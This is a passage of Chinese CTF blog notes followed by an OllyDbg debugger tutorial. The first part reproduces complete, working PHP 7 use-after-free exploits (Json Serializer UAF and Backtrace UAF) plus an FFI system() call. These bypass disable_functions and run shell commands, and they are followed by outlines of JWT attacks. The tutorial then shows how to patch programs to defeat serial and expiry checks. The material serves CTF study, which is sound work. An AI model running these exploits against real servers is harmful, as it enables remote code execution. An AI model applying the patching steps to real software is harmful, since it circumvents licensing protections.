$i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\n访问以下URL即可出现flag。\n\n```\nhttp://challenge-e2dba0faaf3a8abc.sandbox.ctfhub.com:10800/exploit.php\n```\n\n## 17.6  Json Serializer UAF \n\n方法一：蚁剑插件PHP7_Serializer_UAF\n\n方法二：脚本\n\n```php\n#php版本：\n#7.1 - all versions to date\n#7.2 < 7.2.19 (released: 30 May 2019)\n#7.3 < 7.3.6 (released: 30 May 2019)\n<?php\n\n$cmd = \"tac /flag\";\n\n$n_alloc = 10; # increase this value if you get segfaults\n\nclass MySplFixedArray extends SplFixedArray {\n    public static $leak;\n}\n\nclass Z implements JsonSerializable {\n    public function write(&$str, $p, $v, $n = 8) {\n      $i = 0;\n      for($i = 0; $i < $n; $i++) {\n        $str[$p + $i] = chr($v & 0xff);\n        $v >>= 8;\n      }\n    }\n\n    public function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    public function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    # unable to leak ro segments\n    public function leak1($addr) {\n        global $spl1;\n\n        $this->write($this->abc, 8, $addr - 0x10);\n        return strlen(get_class($spl1));\n    }\n\n    # the real deal\n    public function leak2($addr, $p = 0, $s = 8) {\n        global $spl1, $fake_tbl_off;\n\n        # fake reference zval\n        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted\n        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval\n        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)\n\n        $leak = strlen($spl1::$leak);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n\n        return $leak;\n    }\n\n    public function parse_elf($base) {\n        $e_type = $this->leak2($base, 0x10, 2);\n\n        $e_phoff = $this->leak2($base, 0x20);\n        $e_phentsize = $this->leak2($base, 0x36, 2);\n        $e_phnum = $this->leak2($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = $this->leak2($header, 0, 4);\n            $p_flags = $this->leak2($header, 4, 4);\n            $p_vaddr = $this->leak2($header, 0x10);\n            $p_memsz = $this->leak2($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    public function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = $this->leak2($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = $this->leak2($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = $this->leak2($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = $this->leak2($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    public function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = $this->leak2($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    public function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = $this->leak2($addr);\n            $f_name = $this->leak2($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return $this->leak2($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    public function jsonSerialize() {\n        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;\n\n        $contiguous = [];\n        for($i = 0; $i < $n_alloc; $i++)\n            $contiguous[] = new DateInterval('PT1S');\n\n        $room = [];\n        for($i = 0; $i < $n_alloc; $i++)\n            $room[] = new Z();\n\n        $_protector = $this->ptr2str(0, 78);\n\n        $this->abc = $this->ptr2str(0, 79);\n        $p = new DateInterval('PT1S');\n\n        unset($y[0]);\n        unset($p);\n\n        $protector = \".$_protector\";\n\n        $x = new DateInterval('PT1S');\n        $x->d = 0x2000;\n        $x->h = 0xdeadbeef;\n        # $this->abc is now of size 0x2000\n\n        if($this->str2ptr($this->abc) != 0xdeadbeef) {\n            die('UAF failed.');\n        }\n\n        $spl1 = new MySplFixedArray();\n        $spl2 = new MySplFixedArray();\n\n        # some leaks\n        $class_entry = $this->str2ptr($this->abc, 0x120);\n        $handlers = $this->str2ptr($this->abc, 0x128);\n        $php_heap = $this->str2ptr($this->abc, 0x1a8);\n        $abc_addr = $php_heap - 0x218;\n\n        # create a fake class_entry\n        $fake_obj = $abc_addr;\n        $this->write($this->abc, 0, 2); # type\n        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry\n\n        # copy some of class_entry definition\n        for($i = 0; $i < 16; $i++) {\n            $this->write($this->abc, 0x10 + $i * 8, \n                $this->leak1($class_entry + 0x10 + $i * 8));\n        }\n\n        # fake static members table\n        $fake_tbl_off = 0x70 * 4 - 16;\n        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);\n        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);\n\n        # fake zval_reference\n        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval\n        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)\n\n        # look for binary base\n        $binary_leak = $this->leak2($handlers + 0x10);\n        if(!($base = $this->get_binary_base($binary_leak))) {\n            die(\"Couldn't determine binary base address\");\n        }\n\n        # parse elf header\n        if(!($elf = $this->parse_elf($base))) {\n            die(\"Couldn't parse ELF\");\n        }\n\n        # get basic_functions address\n        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {\n            die(\"Couldn't get basic_functions address\");\n        }\n\n        # find system entry\n        if(!($zif_system = $this->get_system($basic_funcs))) {\n            die(\"Couldn't get zif_system address\");\n        }\n        \n        # copy hashtable offsetGet bucket\n        $fake_bkt_off = 0x70 * 5 - 16;\n\n        $function_data = $this->str2ptr($this->abc, 0x50);\n        for($i = 0; $i < 4; $i++) {\n            $this->write($this->abc, $fake_bkt_off + $i * 8, \n                $this->leak2($function_data + 0x40 * 4, $i * 8));\n        }\n\n        # create a fake bucket\n        $fake_bkt_addr = $abc_addr + $fake_bkt_off;\n        $this->write($this->abc, 0x50, $fake_bkt_addr);\n        for($i = 0; $i < 3; $i++) {\n            $this->write($this->abc, 0x58 + $i * 4, 1, 4);\n        }\n\n        # copy bucket zval\n        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);\n        for($i = 0; $i < 12; $i++) {\n            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, \n                $this->leak2($function_zval, $i * 8));\n        }\n\n        # pwn\n        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);\n        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);\n\n        $spl1->offsetGet($cmd);\n\n        exit();\n    }\n}\n\n$y = [new Z()];\njson_encode([&$y]);\n```\n\n## 17.7 Backtrace UAF\n\n方法一：蚁剑插件PHP7_Backtrace_UAF\n\n方法二：脚本\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable \n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\npwn(\"tac /flag\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n```\n\n## 17.8  FFI 扩展\n\n> PHP >= 7.4\n> 开启了 FFI 扩展且 ffi.enable=true \n\n方法一：蚁剑插件PHP74_FFI\n\n方法二：脚本\n\n```php\n<?php\n$ffi = FFI::cdef(\"int system(const char *command);\");\n$ffi->system(\"tac /flag > /tmp/hack\");\necho file_get_contents(\"/tmp/hack\");\n@unlink(\"/tmp/hack\");\n```\n\n## 17.9 iconv\n\n蚁剑方法同11.4\n\n# 18. JSON Web Token\n\n认识JWT：https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob\n\n以下writeup看：https://blog.csdn.net/qq_46150940/article/details/113440680\n\n## 18.1 无签名\n\n一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。 \n\n## 18.2 弱密钥\n\n如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。 \n\n## 18.3 修改签名算法\n\n有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。 \n\n# 19. PHP\n\n```\n处理错误看日志，学习用法读文档\n```\n\nWAMP-Windows Apache MySQL PHP\n\nLAMP-Linux Apache MySQL PHP\n\necho/print\n\n```\necho-可以输出一个或多个字符串，没有返回值\nprint-只允许输出一个字符串(但可以用.连接字符串)，返回值总为1\necho输出速度比print快\necho 'hh','aa';\nprint 'hh'.'aa';\n```\n\n松散比较==，只比较值，不比较类型\n\n严格比较===，比较值和类型\n\n## 19.1 序列化与反序列化\n\n序列化/反序列化 给我们传递对象提供了一种简单的办法\n\n```\nserialize()将一个对象转化成一个字符串\nunserialize()将字符串还原为一个对象\n```\n\n反序列化与POP链(Property-Oriented Programing)\n\n与二进制的ROP(Return-Oriented Programing)原理相似，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。\n\n__toString()触发条件：\n\n1. echo(\\$obj)/print($obj)\n2. 字符串连接时\n3. 格式化字符串时\n4. 与字符串进行\\==比较时(PHP进行==比较时会转换参数类型)\n5. 格式化SQL语句，绑定参数时\n6. 数组中有字符串时\n\n# 20. 模板注入\n\nSSTI(Server-side temple injection)服务端模板注入","categories":["漏洞渗透"],"tags":["Web","PHP"]},{"title":"调试器使用教程","url":"/posts/33a085c7.html","content":"做CTF的逆向题时苦于对大佬们的wp各种看不懂，只因自己太菜跟不上大佬的节奏，所以才写了这一篇最最最基础的，保姆级的，手把手教的，看完包会的调试器使用教程。其中重点讲OllyDbg，参考看雪的书《加密与解密》，参考小甲鱼的视频《OD使用教程》做的笔记，其次做了一些x64dbg与OD有区别的笔记。希望这篇文章不仅能帮助你们看懂大佬们的wp，而且可以自己实现逆向破解，一起加油吧！\n\n<!--more-->\n\n# 一、OllyDbg\n\n## 1. OD界面\n\n{% asset_img OD界面.png OD界面 %}\n\n1. 汇编代码对应的地址窗口：存放虚拟地址，一般情况下同一程序的同一条指令在不同系统环境下此值相同\n2. 汇编代码对应的十六进制机器码窗口\n3. 反汇编窗口\n\n4. 反汇编代码对应的注释信息窗口\n\n5. 寄存器信息窗口(32位4个字节00000000-FFFFFFFF)\n   - EAX扩展累加寄存器\n   - EBX扩展基址寄存器\n   - ECX扩展计数寄存器\n   - EDX扩展数据寄存器\n   - ESI扩展来源寄存器\n   - EDI扩展目标寄存器\n   - EBP扩展基址指针寄存器：主要用于栈和栈桢\n   - ESP扩展堆栈指针寄存器：指向当前进程的栈空间地址\n   - EIP扩展指令指针寄存器：指向下一条要被执行的指令\n\n6. 当前执行到反汇编代码的信息窗口\n\n7. ~9. 数据所在的内存地址，十六进制，ASCII码\n\n10. ~12. 栈地址，存放的数据，对应说明信息\n\n## 2. OD常用的快捷键\n\n| 快捷键   | 功能                                                         |\n| -------- | ------------------------------------------------------------ |\n| F2       | 下断点，也就是指定断点的地址                                 |\n| Alt+B    | 打开断点管理                                                 |\n| 空格     | 快速切换断点状态(开启/禁止)                                  |\n| F3       | 加载一个可执行程序，进行调试分析                             |\n| F4       | 程序执行到光标处                                             |\n| F5       | 缩小、还原当前窗口                                           |\n| F7       | 单步步入                                                     |\n| F8       | 单步步过                                                     |\n| Ctrl+F8  | 自动单步步过                                                 |\n| F9       | 直接运行程序，遇到断点处，程序暂停                           |\n| Ctrl+F2  | 重新运行程序到起始处，一般用于重新调试程序                   |\n| Ctrl+F9  | 执行到函数返回处，用于跳出函数实现                           |\n| Shift+F9 | 与F9相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理 |\n| Alt+F9   | 执行到用户代码处，用于快速跳出函数系统                       |\n| Ctrl+G   | 输入十六进制地址，快速定位到该地址处                         |\n| ；       | 添加注释                                                     |\n\n## 3. 实验一 改变内容\n\n{% asset_img 实验1.png 实验1 %}\n\n目标：将标题改为“v5le0n9”，内容改为“这是我修改的第一个程序”\n\nF3加载程序进OD，F8单步步过，在弹出弹窗的地址F2下断点。Ctrl+F2重新加载程序，F9到达断点处，F7单步步入，F8单步步过，在弹出弹窗的地址按F2下断点，Alt+B查看所有断点，将光标放置在要取消断点的元组，按空格取消。重复以上，直到在注释窗口看到弹窗的内容。\n\n{% asset_img 实验1.1.png 实验1.1 %}\n\n从汇编角度看，“hello”被压入了00937b30地址，“这是我写的第一个程序”被压入了00937b68地址。\n\n在数据窗口按Ctrl+G快速定位到00937b30\n\n{% asset_img 实验1.2.png 实验1.2 %}\n\n双击00937b30的第一个十六进制68，取消keep size，在unicode框中直接修改为v5le0n9（如果原内容用Unicode就用Unicode，ASCII就用ASCII），如果后面没有00要在末尾加上00，因为字符串默认以00结尾。我们这里有很多个00，所以不用管它。\n\n{% asset_img 实验1.3.png 实验1.3 %}\n\n接下来修改内容，Ctrl+G定位到00937b68，发现直接在Unicode改中文不可行，那只能改下面的16进制表示。将我们要输入的字符串改为16进制。\n\n{% asset_img 实验1.4.png 实验1.4 %}\n\n由于PE结构用的是小端存储，所以8fd9要写成d98f表示“这”，以此类推。\n\n{% asset_img 实验1.5.png 实验1.5 %}\n\n再按F9，由于后面没有断点直接运行到程序结束，程序成功修改。\n\n{% asset_img 实验1.6.png 实验1.6 %}\n\n选中我们在数据窗口所有修改过的痕迹，右键->copy to executable file，会弹出一个窗口，图标为D，在窗口内右键->backup->save data to file，另存为exe文件，这就是“破解版”。双击新的exe直接显示我们修改好的内容。\n\n## 4. 容易犯错的调试方法\n\n一路F8，碰到问题下断点，直到把问题解决。就是我们实验一的做法，但在实验一是可行的，因为它不需要用户输入任何东西。如果需要用户输入，实验一的调试会陷入死循环，因为用户没有接触到窗口，它一直在等用户发过来的消息。\n\n{% asset_img 死循环的原因.jpg 死循环的原因 %}\n\n### 4.1 正确的破解方式\n\nWindows程序是以API函数为基础的程序，所有程序都要调用API函数。\n\n程序读取文本框内容的字符串通常用的是以下两个函数：\n\n```\nCtrl+G跟踪表达式\nGetDlgItemTextA(GetDlgItemTextW)\nGetWindowTextA(GetWindowTextW)\n```\n\n汇编代码的返回值约定是存放在eax里面的，如果32位的eax不够存放返回值，系统会将返回值放在内存某个位置并把该位置的地址放在eax返回。\n\n## 5. 实验二 TraceMe\n\n{% asset_img 实验2.png 实验2 %}\n\n目标：无论输入什么都成功。\n\n在IDA查看一下源代码\n\n```c\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  ::hInstance = hInstance;\n  DialogBoxParamA(hInstance, (LPCSTR)0x65, 0, DialogFunc, 0);\n  return 0;\n}\n\nBOOL __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  int v5; // ebx\n  HWND v6; // eax\n  HWND v7; // eax\n  HWND v8; // eax\n  HICON v9; // eax\n  CHAR String2[4]; // [esp+8h] [ebp-F4h]\n  int v11; // [esp+Ch] [ebp-F0h]\n  int v12; // [esp+10h] [ebp-ECh]\n  __int16 v13; // [esp+14h] [ebp-E8h]\n  char v14; // [esp+16h] [ebp-E6h]\n  CHAR v15; // [esp+18h] [ebp-E4h]\n  char v16; // [esp+2Eh] [ebp-CEh]\n  CHAR v17; // [esp+30h] [ebp-CCh]\n  __int16 v18; // [esp+44h] [ebp-B8h]\n  char v19; // [esp+46h] [ebp-B6h]\n  CHAR String; // [esp+48h] [ebp-B4h]\n  CHAR String1; // [esp+98h] [ebp-64h]\n\n  qmemcpy(&v15, byte_405060, 0x16u);\n  v11 = dword_405054;\n  v16 = byte_405060[22];\n  v14 = byte_40505E;\n  qmemcpy(&v17, &unk_405038, 0x14u);\n  *(_DWORD *)String2 = dword_405050;\n  v18 = *((_WORD *)&unk_405038 + 10);\n  v13 = word_40505C;\n  v12 = dword_405058;\n  v19 = *((_BYTE *)&unk_405038 + 22);\n  if ( a2 == 16 )\n  {\n    DestroyWindow(hWnd);\n    return 1;\n  }\n  if ( a2 == 272 )\n  {\n    v9 = LoadIconA(hInstance, (LPCSTR)0x70);\n    SendMessageA(hWnd, 0x80u, 1u, (LPARAM)v9);\n    SendDlgItemMessageA(hWnd, 110, 0xC5u, 0x50u, 0);\n    return 1;\n  }\n  if ( a2 != 273 )\n    return 0;\n  if ( (signed int)(unsigned __int16)a3 > 1013 )\n  {\n    if ( (unsigned __int16)a3 == 1014 || (unsigned __int16)a3 == 40002 )\n      DialogBoxParamA(hInstance, (LPCSTR)0x67, hWnd, sub_401020, 0);\n    return 0;\n  }\n  if ( (unsigned __int16)a3 != 1013 )\n  {\n    if ( (unsigned __int16)a3 == 2 || (unsigned __int16)a3 == 1002 )\n    {\n      SendMessageA(hWnd, 0x10u, 0, 0);\n      return 0;\n    }\n    return 0;\n  }\n  v5 = GetDlgItemTextA(hWnd, 110, &String, 81);\n  GetDlgItemTextA(hWnd, 1000, &String1, 101);\n  if ( String && v5 >= 5 )\n  {\n    if ( sub_401340(&String1, &String, v5) )\n    {\n      lstrcpyA(::String1, String2);\n      v6 = GetDlgItem(hWnd, 110);\n      EnableWindow(v6, 0);\n      v7 = GetDlgItem(hWnd, 1000);\n      EnableWindow(v7, 0);\n      v8 = GetDlgItem(hWnd, 1000);\n    }\n    else\n    {\n      lstrcpyA(::String1, &v17);\n      v8 = GetDlgItem(hWnd, 1000);\n    }\n  }\n  else\n  {\n    lstrcpyA(::String1, &v15);\n    v8 = GetDlgItem(hWnd, 110);\n  }\n  SetFocus(v8);\n  MessageBeep(0);\n  DialogBoxParamA(hInstance, (LPCSTR)0x79, hWnd, sub_401060, 0);\n  return 0;\n}\n```\n\n可知程序用的是`GetDlgItemTextA`函数，Ctrl+G查找函数，F2下断点。按F9，会弹出输入框，输入后一路F8，直到看到我们刚才输入的内容，再仔细分析接下来的汇编。\n\n```asm\n004011D7      .  8D5424 4C     lea edx,dword ptr ss:[esp+0x4C];v5le0n9\n004011DB      .  53            push ebx;ebx=7,用户名长度\n004011DC      .  8D8424 A00000>lea eax,dword ptr ss:[esp+0xA0];l30n9ry0n\n004011E3      .  52            push edx;将用户名push进去\n004011E4      .  50            push eax;将序列号push进去\n004011E5      .  E8 56010000   call TraceMe.00401340;验证用户名和序列号的函数\n004011EA      .  8B3D BC404000 mov edi,dword ptr ds:[<&USER32.GetDlgIte>;  user32.GetDlgItem\n004011F0      .  83C4 0C       add esp,0xC\n004011F3      .  85C0          test eax,eax;TraceMe.00401340函数的返回值\n004011F5      . /74 37         je short TraceMe.0040122E;跳转\n```\n\n因为我们现在是暴力破解，所以可以不用进验证函数查看具体验证操作，直接改函数的返回值即可。在`test eax,eax`执行完后，也就是在`je short TraceMe.0040122E`指令将寄存器中Z标志位改变。F9走到程序结束，弹窗成功了。\n\n{% asset_img 实验2.1.png 实验2.1 %}\n\n如果想保存破解版的话，直接改标志位是不可行的。另一种方法是将`je short TraceMe.0040122E`改为`nop`或改为`jne short TraceMe.0040122E`，右键->保存到可执行文件->选择，在D图标中右键->备份->保存数据到文件。破解版无论输入什么都是成功的。\n\n## 6. 加载目标文件调试\n\n设置OD中断在程序的入口点：Options->Debugging options->Events\n\n```\nsystem breakpoint \t\t\t系统断点(int 13)\nentry point of main module \t主模块的入口点，即文件的入口点\nwinmain \t\t\t\t\t程序的WinMain()函数入口点\n```\n\n### 6.1 call指令\n\n`call xxx`等同于`push eip;jmp xxx`\n\n```\ncall 404000h\t\t\t直接跳到函数或过程的地址\ncall eax\t\t\t\t函数或过程地址存放在eax\ncall dword ptr [eax]\ncall dword ptr [eax+5]\ncall dword ptr [<&API>]\t执行一个系统API:系统提供给我们的接口\n```\n\n### 6.2 mov指令\n\nmov指令格式：mov dest, src\n\n> 将src的内容拷贝到dest\n\n#### 6.2.1 **mov扩展**\n\nmovs/movsb/movsw/movsd edi, esi：按串/字节/字/双字节为单位将esi寄存器指向的数据复制到edi寄存器指向的空间。\n\nmovsx：符号位扩展，byte->word, word->dword(扩展后高位全用符号位填充)，然后实现mov。\n\n```asm\nMOV BL,80H\nMOVSX AX,BL\n运行完以上汇编语句之后，AX的值为FF80H。由于BL为80H=1000 0000，最高位也即符号位为1，在进行带符号扩展时，其扩展的高8位均为1，故赋值AX为1111 1111 1000 0000，即AX=FF80H。\n```\n\nmovzx：零扩展，byte->word, word->dword(扩展后高位全用0填充)，然后实现mov。\n\n### 6.3 cmp指令\n\ncmp指令格式：cmp dest, src\n\n> 比较两个操作数，并通过比较结果设置C/O/Z标志位\n\n```\ncmp eax, ebx\t\t相等Z标志位置1，否则置0\ncmp eax, [404000]\t取404000h地址的dword型数据与eax相比较\ncmp [404000], eax\n```\n\nZ标志位：Zero 零标志位 运算结果为0时置1，否则置0\n\nO标志位：Overflow 溢出标志位 溢出置1，否则置0\n\nC标志位：Carry flag 进位标志位 进位置1，否则置0\n\n### 6.4 test指令\n\ntest指令格式：test dest, src\n\n> 和and指令一样，对两个操作数进行按位与运算，但test指令不将结果保存到test中，仅对标志位重新置位\n\n```\ntest eax, eax\t\t如果eax为的值0，则Z标志位置1\n```\n\neax存放所有函数的返回值。\n\n### 6.5 条件跳转指令\n\n想让它跳转就设置无条件跳转jmp指令\n\n不想让它跳转设置nop指令\n\n调试的时候注重跳转指令和cmp指令还有test指令。\n\n破解版(免注册机)：全选修改过的程序右键->复制到可执行文件->选择，会生成一个文件，文件右键->备份->保存数据到文件。\n\n跳过指令的方法：\n\n1. 改为无条件跳转指令jmp\n2. 将需要跳过的地方全用nop填充(右键->二进制->用NOP填充)\n\n### 6.6 patch(补丁)\n\nOD可用`/`(有的OD是`P`)查看修改的内容\n\n## 7. 实验三 ReverseMe\n\n{% asset_img 实验3.png 实验3 %}\n\n目标：让它绕过过期指令。\n\nF3加载进OD，可以看到这个程序很小，汇编代码量不多。右键->中文搜索引擎->智能搜索，查看字符串。\n\n```asm\n中文搜索引擎\n地址       反汇编                               文本字符串\n00401000   push 0x0                            (Initial CPU selection)\n0040106E   push reverseM.00402079              Keyfile.dat\n0040107F   push reverseM.00402000              Key File ReverseMe\n00401084   push reverseM.00402017              Evaluation period out of date.Purchase new license\n004010F9   push reverseM.00402000              Key File ReverseMe\n004010FE   push reverseM.00402086              Keyfile is not valid. Sorry.\n00401207   push reverseM.00402000              Key File ReverseMe\n0040120C   push reverseM.004020DE              You really did it! Congratz !!!\n```\n\n再结合注释窗口，我们可以知道，`Keyfile.dat`是存储许可证的地方，有三个`MessageBox`，但运行程序只会弹出一个，可能是if语句。我们现在要让它弹出`You really did it! Congratz !!!`。\n\n因为这个程序很小，从头开始就可以认真看汇编，关键是跳转指令，千万不要让它跳转到其它弹窗。\n\n```asm\njnz short 0040109A\t\t=>\tjz short 0040109A或jmp short 0040109A\njnz short 004010B4\t\t=>\tjz short 004010B4或jmp short 004010B4\njl short 004010F7\t\t=>\tjnl short 